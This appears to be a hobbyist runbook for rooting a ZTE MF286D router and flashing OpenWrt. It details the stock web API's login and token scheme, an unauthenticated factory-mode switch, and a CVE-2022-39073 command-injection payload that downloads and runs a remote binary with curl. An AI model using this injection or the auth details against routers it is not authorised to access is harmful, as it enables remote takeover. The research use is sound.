# ZTE MF286D — no-serial OpenWrt + root research runbook

Species-level notes for `models/zte-mf286d.json`. Everything below was
verified live on a Nordic/Telia B10-generation unit (conwrt #621) unless
marked otherwise. Unit identifiers stay in the private project.

## Stock web API (the control surface)

- Login: `POST /goform/goform_set_cmd_process` with
  `goformId=LOGIN&password=<SHA256hex-UPPERCASE(Base64(pw))>`.
  **Uppercase hex** — the lowercase token silently fails (cost us two
  lockout entries). The UI's own `js/util.js` defines
  `paswordAlgorithmsCookie(e) = SHA256(Base64(e))` and the page's md5/sha
  libs emit uppercase.
- Per-POST auth: `AD = md5hex(md5hex(wa_inner_version + cr_version) + RD)`;
  `RD` is readable unauthenticated (`cmd=RD`). Sessions are IP-bound.
- Lockout: 5 fails → 300 s, **persisted across reboots**. Never brute force.
- Most reliable write channel = authenticated browser context (headless
  chromium + playwright, drive the page's own `fetch` so cookies + tokens
  are exactly what the UI would send). Bare-curl sessions produced
  ambiguous `failure` results for several goformIds (SET_DEVICE_LED,
  URL_FILTER_ADD) that succeed from a real logged-in page.
- Useful unauthenticated reads: `wa_inner_version`, `cr_version`,
  `psw_fail_num_str`, `login_lock_time`, `RD`.

## Factory / Sales-Update-Framework channel (verified live)

`POST /goform/goform_process` (note: different endpoint than
`goform_set_cmd_process`):

| request | response |
|---|---|
| `goformId=SwitchFactoryMode&SwitchCMD=Query` | `FactoryResult:Closed` |
| `goformId=SwitchFactoryMode&SwitchCMD=Open` | `FactoryResult:Success` / `FactoryResult:Opened` |
| `goformId=ONLINE_UPGRADE_TOOL&command=get_current_version` | `$$<variant>;;<wa>;<wa>;<cr>;…` **unauthenticated** |

Download mode (device side): becomes a DHCP **client** requesting
`192.168.32.1`, ARPs every 1–5 s for the tool host `192.0.0.1`, then
tftp-GETs `armprgZTE.bin` from the tool's TFTP :69 → Sahara hello
(8×1 s) → Firehose. One-shot per boot attempt. No TCP ports answer in
this state (scan 1-9999 negative; transport is UDP/TFTP-based).

## CVE-2022-39073 — the working root primitive

`WATCH_DOG_SWITCH` → `net_link_detect_url` → `zte_net_link_detect` runs
`system("watch_dog_ping.sh <url> <times> &")` — the URL re-tokenizes
through `/bin/sh` there. On our unit:

- handler answers, and a 63-char `;`-payload stores **byte-intact**
  (readback verified)
- **gate**: `ppp_status ∈ {ppp_connected, ipv4_ipv6_connected,
  ipv6_connected}` — exact match! `"connected" in "ppp_disconnected"`
  is a false-positive trap that cost us a fire attempt with no listener
- payload (curl and tftp both exist in this generation's rootfs):

  ```
  ;curl -o /tmp/s http://<host>:<port>/s;chmod +x /tmp/s;/tmp/s
  ```

- **the same feature reboots the box after `ping_times` failed pings** —
  arm with `ping_times=999` or the box reboot-cycles (observed: box ended
  up sitting in download mode after watchdog reboots with the factory flag
  set)
- PoC reference: `v0lp3/CVE-2022-39073` (MF286R, plain-Base64 login era —
  our generation needs the sha256-UPPER token instead)

## Dead ends proven on this generation

- Leo-PL `websURLFilters → zte_debug.sh` chain: our `zte_debug.sh` is a
  log-compression script (no tftp/exec). `ipacm_switch.sh` only tests the
  filter string for emptiness. Stored injection entries found on a
  second-hand unit were inert cargo-cult.
- CVE-2023-25649 (`SET_DEVICE_LED`): time fields are strict
  `digits+colon`; `night_mode_close_all_led` accepts arbitrary strings
  but no exec was observable at runtime (the `adb shell cfg set` template
  exists in the string table but appears not to be the runtime path).
- Wine 9.0 runs `ZTE_Sales_Update_Framework.exe` only to splash +
  "Check update fail." + page fault (native MFC overrides attempted).
  Use WinPE in QEMU instead (community standard: Hiren's/Gandalf PE).

## Flashing (no serial)

1. Image: kit `root_uImage` (2022-era bootstrap, then LuCI sysupgrade) or
   build fresh from the official 25.12.6 sysupgrade with
   `ZTE-MF286D-root_uImage-Builder`. Stock rollback = kit's
   `root_uImageorig`. Verify sha256 before use (values in model JSON).
2. Rig: QEMU + WinPE ISO on a build host, bridged to the NIC facing the
   device (point-to-point cable or isolated DUT-bay VLAN — the download
   mode box runs its own addressing at 192.168.32.0/24). Serve the kit
   dir to the guest as a virtual FAT disk; run
   `ZTE_Sales_Update_Framework.exe`, SW_PATH → UPDATE/, PLAY.
3. Capture the whole session (`tcpdump` on the bridge) — that pcap is the
   spec for a future Linux-native `conwrt` flasher (nobody has one; only
   USB-oriented EDL tools exist).
4. Post-flash: dump all remaining partitions from OpenWrt
   (`nanddump`, NOR `0:config`/ART first) — that is the unit-unique
   backup; mtd8/9 stock equivalents are publicly archived at
   dl.eko.one.pl.

## Operational traps (each one bit us)

- r8152 USB NICs disconnect-storm under load until `power/control=on`.
- Laptop/desktop `tmpfiles` cleaners remove staged ISOs/scripts across
  multi-day sessions.
- Shared build hosts: payload-server ports (8080!) are often already
  taken by other lanes' docker — verify binds before arming remote URLs,
  or the exec fetches docker's 404 and you burn a watchdog cycle.
- The write tool's files can take ~2 s to appear in `/tmp` — retry scp.
- HERDR + ssh chains die mid-command under load; stage big operations as
  on-disk launcher scripts and verify process liveness afterwards.
